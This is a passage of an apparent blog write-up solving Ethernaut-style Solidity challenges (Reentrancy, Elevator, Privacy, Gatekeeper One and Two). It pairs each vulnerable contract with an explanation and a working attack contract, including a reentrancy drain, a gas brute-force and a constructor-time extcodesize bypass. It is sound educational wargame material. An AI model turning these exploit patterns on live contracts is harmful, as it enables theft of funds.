</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_amount</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=n>_amount</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=p>(</span><span class=kt>bool</span> <span class=n>result</span><span class=p>,)</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span><span class=n>_amount</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_amount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>_amount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>To complete this challenge, we have to steal all the ether present in the contract&rsquo;s account. The bug is in the &ldquo;withdraw&rdquo; function. Even though, it checks whether the withdraw amount is greater then the balance, the state i.e balance after withdraw, is only updated after sending the ether by making an &ldquo;external call&rdquo;. To see why this is dangerous, remember that we can implement &ldquo;fallback&rdquo; functions which will be called when data field is empty or it doesn&rsquo;t match any function signature. So, when the challenge contract sends ether, if receiving account is not a externally owned account, then that account has the ability to transfer the execution to any other contract or just finish and return to the challenge contract. if the &ldquo;fallback&rdquo; function just returns without doing anything then everything works as intended but if &ldquo;fallback&rdquo; function calls &ldquo;withdraw&rdquo; function again, as the balance is not yet updated, it will result in the transfer of ether using &ldquo;call&rdquo; to the same contract. recursively, we can steal all the ether present in the challenge contract. Note that, &ldquo;call&rdquo; transfers all the available gas when not set explicitly and this attack could be prevented by sending particular amount of gas not enough for re-entrancy.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>Re</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>donate</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_amount</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Re</span> <span class=n>reentrace</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>reentrace</span> <span class=o>=</span> <span class=n>Re</span><span class=p>(</span><span class=mh>0xB041a6080273501b83218302E75fA5e7b9D8aCa4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>reentrace</span><span class=p>.</span><span class=n>donate</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>}(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>()</span> <span class=k>payable</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>reentrace</span><span class=p>.</span><span class=n>withdraw</span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fallback</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>reentrace</span><span class=p>.</span><span class=n>withdraw</span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=elevator>Elevator</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>Building</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>isLastFloor</span><span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Elevator</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>public</span> <span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint</span> <span class=k>public</span> <span class=n>floor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>goTo</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_floor</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Building</span> <span class=n>building</span> <span class=o>=</span> <span class=n>Building</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=n>building</span><span class=p>.</span><span class=n>isLastFloor</span><span class=p>(</span><span class=n>_floor</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>floor</span> <span class=o>=</span> <span class=n>_floor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>top</span> <span class=o>=</span> <span class=n>building</span><span class=p>.</span><span class=n>isLastFloor</span><span class=p>(</span><span class=n>floor</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>we have to set &ldquo;top&rdquo; variable to true to pass this challenge. &ldquo;goTo&rdquo; function is expected to be called from a Building contract and to set &ldquo;top&rdquo; to &ldquo;true&rdquo;, on the first call of &ldquo;isLastFloor&rdquo;, it has to return &ldquo;false&rdquo; and on the second call, it should return &ldquo;true&rdquo;. We can use a state variable to track &ldquo;isLastFloor&rdquo; calls and return appropriate boolean based on that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>elevator</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>goTo</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_floor</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>top</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>elevator</span> <span class=n>el</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>el</span> <span class=o>=</span> <span class=n>elevator</span><span class=p>(</span><span class=mh>0xA06C21cf156f0741F2c8F0CaeA78f8F901178F00</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>attack</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>el</span><span class=p>.</span><span class=n>goTo</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>isLastFloor</span><span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>top</span> <span class=o>=</span> <span class=o>!</span><span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=privacy>Privacy</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Privacy</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>public</span> <span class=n>locked</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>public</span> <span class=n>ID</span> <span class=o>=</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8</span> <span class=k>private</span> <span class=n>flattening</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8</span> <span class=k>private</span> <span class=n>denomination</span> <span class=o>=</span> <span class=mi>255</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16</span> <span class=k>private</span> <span class=n>awkwardness</span> <span class=o>=</span> <span class=kt>uint16</span><span class=p>(</span><span class=nb>now</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>bytes32</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=k>private</span> <span class=nb>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>bytes32</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=k>memory</span> <span class=n>_data</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>data</span> <span class=o>=</span> <span class=n>_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>unlock</span><span class=p>(</span><span class=kt>bytes16</span> <span class=n>_key</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>_key</span> <span class=o>==</span> <span class=kt>bytes16</span><span class=p>(</span><span class=nb>data</span><span class=p>[</span><span class=mi>2</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>    <span class=n>locked</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    A bunch of super advanced solidity algorithms...
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
</span></span></span><span class=line><span class=cl><span class=cm>      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
</span></span></span><span class=line><span class=cl><span class=cm>      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,/V\
</span></span></span><span class=line><span class=cl><span class=cm>      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
</span></span></span><span class=line><span class=cl><span class=cm>      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
</span></span></span><span class=line><span class=cl><span class=cm>  */</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This challenge is similar &ldquo;Vault&rdquo; challenge, in this we have to read private &ldquo;data&rdquo; variable and call &ldquo;unlock&rdquo; function with it. solidity follows few rules while allocating storage slots to state variables, they can be best understood by reading through solidity docs, you can find them [<a href=https://docs.soliditylang.org/en/v0.8.9/internals/layout_in_storage.html target=_blank rel="noopener noreferrer">here</a>
].</p><p>The &ldquo;data[2]&rdquo; is stored at slot 5 and bytes16 of bytes32 value returns first 16 bytes. so, we can read the slot 5 and call unlock using most significant 16 bytes.</p><h3 id=gatekeeper-one>Gatekeeper One</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>GatekeeperOne</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>entrant</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateOne</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateTwo</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>gasleft</span><span class=p>().</span><span class=n>mod</span><span class=p>(</span><span class=mi>8191</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateThree</span><span class=p>(</span><span class=kt>bytes8</span> <span class=n>_gateKey</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>==</span> <span class=kt>uint16</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>)),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part one&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>!=</span> <span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part two&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>==</span> <span class=kt>uint16</span><span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part three&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>enter</span><span class=p>(</span><span class=kt>bytes8</span> <span class=n>_gateKey</span><span class=p>)</span> <span class=k>public</span> <span class=n>gateOne</span> <span class=n>gateTwo</span> <span class=n>gateThree</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>)</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>entrant</span> <span class=o>=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This challenge requires us to pass 3 gates, each representing a condition using modifiers and require statements. &ldquo;gateOne&rdquo; is the same condition as &ldquo;Telephone&rdquo; challenge. coming to &ldquo;gateTwo&rdquo;, it checks if gasleft modulo 8191 is 0 or not. gasleft is the amount of gas remaining for rest of the execution. When calling from a contract, we can set the amount of gas we want to forward, so, that gas amount can be bruteforced until this check passes. &ldquo;gateThree&rdquo; depends on the uint conversion. When a uint is converted to a lower size &ldquo;uint&rdquo;, the resulting value will be lower size bits of the original value. So, to pass</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>==</span> <span class=kt>uint16</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>)),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part one&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>uint16 takes lower 16 bits, whereas uint32 takes lower 32 bits, to make them to be equal we can set bits 16-31 to 0 given bits are numbered with lsb as 0.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>!=</span> <span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part two&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>upper 32 bits of uint64(_gateKey) should not be 0. The last check is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=kt>uint32</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>))</span> <span class=o>==</span> <span class=kt>uint16</span><span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>),</span> <span class=s>&#34;GatekeeperOne: invalid gateThree part three&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>This requires lower 16 bits to be equal lower 16 bits of tx.origin.</p><p>final exploit is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Hack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>bytes8</span> <span class=n>key</span> <span class=o>=</span> <span class=kt>bytes8</span><span class=p>(</span><span class=mh>0x6cC879AdbCEF2aEC</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF0000FFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//  bytes8 public m = bytes8(abi.encodePacked(tx.origin)) &amp; 0xFFFFFFFF0000FFFF;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>enterGate</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>uint</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mi>120</span><span class=p>;</span><span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=mh>0xf36D7330A95B42B0356932e670eB6c3600ceb146</span><span class=p>).</span><span class=nb>call</span><span class=p>{</span><span class=nb>gas</span><span class=o>:</span><span class=n>i</span><span class=o>+</span><span class=mi>150</span><span class=o>+</span><span class=mi>8191</span><span class=o>*</span><span class=mi>3</span><span class=p>}(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;enter(bytes8)&#34;</span><span class=p>,</span> <span class=n>key</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=gatekeeper-two>Gatekeeper Two</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>GatekeeperTwo</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>entrant</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateOne</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateTwo</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint</span> <span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>assembly</span> <span class=p>{</span> <span class=n>x</span> <span class=o>:=</span> <span class=nf>extcodesize</span><span class=p>(</span><span class=nf>caller</span><span class=p>())</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>require</span><span class=p>(</span><span class=n>x</span> <span class=err>==</span> <span class=mi>0</span><span class=p>)</span><span class=err>;</span>
</span></span><span class=line><span class=cl>    <span class=n>_</span><span class=err>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>gateThree</span><span class=p>(</span><span class=kt>bytes8</span> <span class=n>_gateKey</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=kt>bytes8</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>))))</span> <span class=o>^</span> <span class=kt>uint64</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>)</span> <span class=o>==</span> <span class=kt>uint64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>enter</span><span class=p>(</span><span class=kt>bytes8</span> <span class=n>_gateKey</span><span class=p>)</span> <span class=k>public</span> <span class=n>gateOne</span> <span class=n>gateTwo</span> <span class=n>gateThree</span><span class=p>(</span><span class=n>_gateKey</span><span class=p>)</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>entrant</span> <span class=o>=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This challenge as above challenge requires us to pass three gates. first gate is same while second gate checks if the caller is smart contract or not. &ldquo;extcodesize&rdquo; returns the length of the code in bytes at the given address, this gate requires it to be 0. But &ldquo;gateOne&rdquo; requires caller to be a smart contract. The solution for this is to call this contract from the constructor. When called from the constructor, the contract&rsquo;s final code is not yet returned to the evm and it will only be done after finishing this call, as a result the codesize will still be 0 at the caller&rsquo;s address. so, &ldquo;extcodesize&rdquo; returns 0 when called from the constructor allowing us to pass this gate. &ldquo;gateThree&rdquo; checks the passed &ldquo;gateKey&rdquo; using &ldquo;xor&rdquo; operation. we can change the variables in the equation and find the required &ldquo;gateKey&rdquo; easily.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>attack</span> <span class=p>{</span>
